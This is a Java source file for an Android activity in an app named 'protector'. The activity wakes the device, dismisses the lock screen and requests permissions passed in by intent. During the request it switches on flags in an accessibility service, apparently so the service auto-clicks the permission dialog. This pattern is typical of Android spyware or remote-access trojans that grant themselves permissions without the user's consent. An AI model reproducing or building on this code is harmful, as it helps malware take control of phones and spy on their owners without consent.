package com.icontrol.protector;


import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;


import android.view.Window;
import android.view.WindowManager;


import androidx.core.app.ActivityCompat;

public class RequestPermissions2 extends Activity {
    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }
    @Override
    public void onCreate(Bundle v) {


        super.onCreate(v);
        requestWindowFeature(Window.FEATURE_NO_TITLE);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        try
        {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {

                getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN
                );
                KeyguardManager keyguardManager = (KeyguardManager) getApplicationContext().getSystemService(Context.KEYGUARD_SERVICE);
                keyguardManager.requestDismissKeyguard(this, null);
                setShowWhenLocked(true);
                //   setTurnScreenOn(true);
            } else {

                getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        WindowManager.LayoutParams.FLAG_FULLSCREEN|

                                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD|
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
                                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
            }
        }catch (Exception ed){
            try {
                getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        WindowManager.LayoutParams.FLAG_FULLSCREEN|

                                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD|
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
                                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
            }catch (Exception f)
            {
                try
                {
                    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                            WindowManager.LayoutParams.FLAG_FULLSCREEN
                    );
                }catch (Exception gg){

                }
            }

        }
        try
        {
            Intent intent = getIntent();
            ToAskNew = intent.getStringArrayExtra("Data");

            if (ToAskNew != null)
            {

                int PERMISSION_ALL = 151;
                String[] PERMISSIONS = ToAskNew;
                if(!hasPermissions(this, PERMISSIONS)){
                    ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
                    ToggleAccess(true);
                }else {
                    finish();
                }

            }else
            {
                finish();
            }


        }catch (Exception e ){
            finish();
        }

    }
    private void ToggleAccess(boolean state){

        AccessServices.FOR_PRIMS = state;
        AccessServices.Auto_Click = state;

    }
    public static String[] ToAskNew;

    @Override
    public void onRequestPermissionsResult(int requestCode,  String[] permissions,  int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //finish();
        switch (requestCode) {
            case 151:{
                if (grantResults.length >0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    ToggleAccess(false);
                    finish();

                }
            }
        }
    }
}